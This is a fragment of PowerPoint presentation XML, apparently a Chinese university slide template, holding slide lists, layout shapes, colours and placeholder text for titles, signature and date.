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9.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0"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId3"/>
    <p:sldId id="906" r:id="rId5"/>
    <p:sldId id="908" r:id="rId6"/>
    <p:sldId id="907" r:id="rId7"/>
    <p:sldId id="910" r:id="rId8"/>
    <p:sldId id="911" r:id="rId9"/>
    <p:sldId id="914" r:id="rId10"/>
    <p:sldId id="912" r:id="rId11"/>
    <p:sldId id="913" r:id="rId12"/>
    <p:sldId id="916" r:id="rId13"/>
    <p:sldId id="917" r:id="rId14"/>
    <p:sldId id="918" r:id="rId15"/>
    <p:sldId id="920" r:id="rId16"/>
    <p:sldId id="922" r:id="rId17"/>
    <p:sldId id="919" r:id="rId18"/>
    <p:sldId id="921" r:id="rId19"/>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E82F69B-3CD6-45F5-835E-96710F2B870A}">
          <p14:sldIdLst>
            <p14:sldId id="256"/>
            <p14:sldId id="906"/>
            <p14:sldId id="908"/>
            <p14:sldId id="907"/>
            <p14:sldId id="910"/>
            <p14:sldId id="911"/>
            <p14:sldId id="914"/>
            <p14:sldId id="912"/>
            <p14:sldId id="913"/>
            <p14:sldId id="916"/>
            <p14:sldId id="917"/>
            <p14:sldId id="918"/>
            <p14:sldId id="920"/>
            <p14:sldId id="922"/>
            <p14:sldId id="919"/>
            <p14:sldId id="921"/>
          </p14:sldIdLst>
        </p14:section>
      </p14:sectionLst>
    </p:ext>
    <p:ext uri="{EFAFB233-063F-42B5-8137-9DF3F51BA10A}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="1" orient="horz" pos="2092" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="3839" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="3" pos="6802" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" pos="889" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="760" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" orient="horz" pos="51" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="7" orient="horz" pos="4072" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="8" orient="horz" pos="301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 华" initials="李" lastIdx="1" clrIdx="0"/>
  <p:cmAuthor id="2" name="许 娜" initials="许" lastIdx="4" clrIdx="1"/>
  <p:cmAuthor id="3" name="戚圣嘉" initials="戚圣嘉" lastIdx="2"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FFFF"/>
    <a:srgbClr val="0C00F4"/>
    <a:srgbClr val="1F4E79"/>
    <a:srgbClr val="BAC9D6"/>
    <a:srgbClr val="AEAEAE"/>
    <a:srgbClr val="EDEDED"/>
    <a:srgbClr val="B7C5EF"/>
    <a:srgbClr val="80C04D"/>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09" autoAdjust="0"/>
    <p:restoredTop sz="95383" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" showGuides="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="84" d="100"/>
          <a:sy n="84" d="100"/>
        </p:scale>
        <p:origin x="571" y="86"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide orient="horz" pos="2092"/>
        <p:guide pos="3839"/>
        <p:guide pos="6802"/>
        <p:guide pos="889"/>
        <p:guide orient="horz" pos="760"/>
        <p:guide orient="horz" pos="51"/>
        <p:guide orient="horz" pos="4072"/>
        <p:guide orient="horz" pos="3012"/>
      </p:guideLst>
    </p:cSldViewPr>
  </p:slideViewPr>
  <p:outlineViewPr>
    <p:cViewPr>
      <p:scale>
        <a:sx n="33" d="100"/>
        <a:sy n="33" d="100"/>
      </p:scale>
      <p:origin x="0" y="-330"/>
    </p:cViewPr>
  </p:outlineViewPr>
  <p:notesTextViewPr>
    <p:cViewPr>
      <p:scale>
        <a:sx n="125" d="100"/>
        <a:sy n="125" d="100"/>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gs" Target="tags/tag1.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02624CE-7C2E-4E83-947B-0B9B4867D61D}"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A3CE8C-7721-4627-9962-8DC500CBB764}"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B8F2AF-B165-49ED-8D49-F91D3C9FFCC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0F3238-B197-4DD0-8393-B222E6E85519}"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mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>补充：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>无</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="灯片编号占位符 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{790F3238-B197-4DD0-8393-B222E6E85519}"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alphaModFix amt="50000"/>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886" y="1"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9801" name="副标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="673100" y="3870251"/>
            <a:ext cx="10845800" cy="468637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="384479"/>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9802" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="673099" y="2920209"/>
            <a:ext cx="10845800" cy="894050"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr">
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="文本占位符 13"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="673099" y="4394880"/>
            <a:ext cx="10845800" cy="371475"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="3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署名</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="文本占位符 13"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="11" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="673099" y="4766355"/>
            <a:ext cx="10845800" cy="371475"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr sz="1200" b="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="3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日期</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="381000" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C4251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9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="381000" cy="381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nvGrpSpPr>
          <p:cNvPr id="2" name="Group 1"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8763001" y="6477000"/>
            <a:ext cx="3429000" cy="381000"/>
            <a:chOff x="8763001" y="6477000"/>
            <a:chExt cx="3429000" cy="381000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="5400000">
              <a:off x="10287001" y="4953000"/>
              <a:ext cx="381000" cy="3429000"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="C4251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14" name="Rectangle 13"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="5400000">
              <a:off x="11811001" y="6477000"/>
              <a:ext cx="381000" cy="381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pic>
        <p:nvPicPr>
          <p:cNvPr id="1028" name="Picture 4" descr="http://zsjy.gzhu.edu.cn/images/pic_logo.png"/>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t="-1" r="45034" b="-7143"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="391886" y="-1"/>
            <a:ext cx="3463289" cy="1028700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="22" name="图片 2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993086" y="-39914"/>
            <a:ext cx="1113116" cy="1113116"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="23" name="图片 2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895063" y="-19958"/>
            <a:ext cx="1484186" cy="1068614"/>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Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="381000"/>
            <a:ext cx="609600" cy="6477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8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582400" y="0"/>
            <a:ext cx="612648" cy="6126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dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Picture Placeholder 28"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="3352800" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-MY"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3944679" y="0"/>
            <a:ext cx="7575809" cy="1028700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" anchor="b" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>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alphaModFix amt="80000"/>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0" y="-21266"/>
            <a:ext cx="12192000" cy="6879266"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="381000"/>
            <a:ext cx="609600" cy="6477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6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="0"/>
            <a:ext cx="609600" cy="6126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nvGrpSpPr>
          <p:cNvPr id="2" name="组合 1"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4541217" y="1516136"/>
            <a:ext cx="3109566" cy="911046"/>
            <a:chOff x="4541217" y="1516136"/>
            <a:chExt cx="3109566" cy="911046"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4541217" y="1516136"/>
              <a:ext cx="3109566" cy="651569"/>
            </a:xfrm>
            <a:prstGeom prst="rect">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800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Right Triangle 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="18900000">
              <a:off x="5913103" y="2056199"/>
              <a:ext cx="365794" cy="370983"/>
            </a:xfrm>
            <a:prstGeom prst="rtTriangle">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent2"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="2721935"/>
            <a:ext cx="6039972" cy="1435395"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>单击此处添加幻灯片章节标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="文本占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="4327286"/>
            <a:ext cx="6039972" cy="443643"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="002060"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">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alphaModFix amt="80000"/>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0" y="-21266"/>
            <a:ext cx="11649807" cy="6879266"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="381000"/>
            <a:ext cx="609600" cy="6477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6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="0"/>
            <a:ext cx="609600" cy="6126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nvGrpSpPr>
          <p:cNvPr id="2" name="组合 1"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4541217" y="1516136"/>
            <a:ext cx="3109566" cy="911046"/>
            <a:chOff x="4541217" y="1516136"/>
            <a:chExt cx="3109566" cy="911046"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4541217" y="1516136"/>
              <a:ext cx="3109566" cy="651569"/>
            </a:xfrm>
            <a:prstGeom prst="rect">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800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Right Triangle 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="18900000">
              <a:off x="5913103" y="2056199"/>
              <a:ext cx="365794" cy="370983"/>
            </a:xfrm>
            <a:prstGeom prst="rtTriangle">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent2"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="2721935"/>
            <a:ext cx="6039972" cy="1435395"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>单击此处添加幻灯片章节标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="文本占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="4327286"/>
            <a:ext cx="6039972" cy="443643"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="002060"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">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alphaModFix amt="80000"/>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1609756" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="381000"/>
            <a:ext cx="609600" cy="6477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6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="0"/>
            <a:ext cx="609600" cy="6126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nvGrpSpPr>
          <p:cNvPr id="2" name="组合 1"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4541217" y="1516136"/>
            <a:ext cx="3109566" cy="911046"/>
            <a:chOff x="4541217" y="1516136"/>
            <a:chExt cx="3109566" cy="911046"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4541217" y="1516136"/>
              <a:ext cx="3109566" cy="651569"/>
            </a:xfrm>
            <a:prstGeom prst="rect">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800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Right Triangle 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="18900000">
              <a:off x="5913103" y="2056199"/>
              <a:ext cx="365794" cy="370983"/>
            </a:xfrm>
            <a:prstGeom prst="rtTriangle">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent2"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="2721935"/>
            <a:ext cx="6039972" cy="1435395"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>单击此处添加幻灯片章节标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="文本占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="4327286"/>
            <a:ext cx="6039972" cy="443643"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">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alphaModFix amt="80000"/>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1582401" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="381000"/>
            <a:ext cx="609600" cy="6477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6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11582401" y="0"/>
            <a:ext cx="609600" cy="6126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nvGrpSpPr>
          <p:cNvPr id="2" name="组合 1"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4541217" y="1516136"/>
            <a:ext cx="3109566" cy="911046"/>
            <a:chOff x="4541217" y="1516136"/>
            <a:chExt cx="3109566" cy="911046"/>
          </a:xfrm>
          <a:noFill/>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4541217" y="1516136"/>
              <a:ext cx="3109566" cy="651569"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:grp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800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="Right Triangle 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm rot="18900000">
              <a:off x="5913103" y="2056199"/>
              <a:ext cx="365794" cy="370983"/>
            </a:xfrm>
            <a:prstGeom prst="rtTriangle">
              <a:avLst/>
            </a:prstGeom>
            <a:grp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sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="2721935"/>
            <a:ext cx="6039972" cy="1435395"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
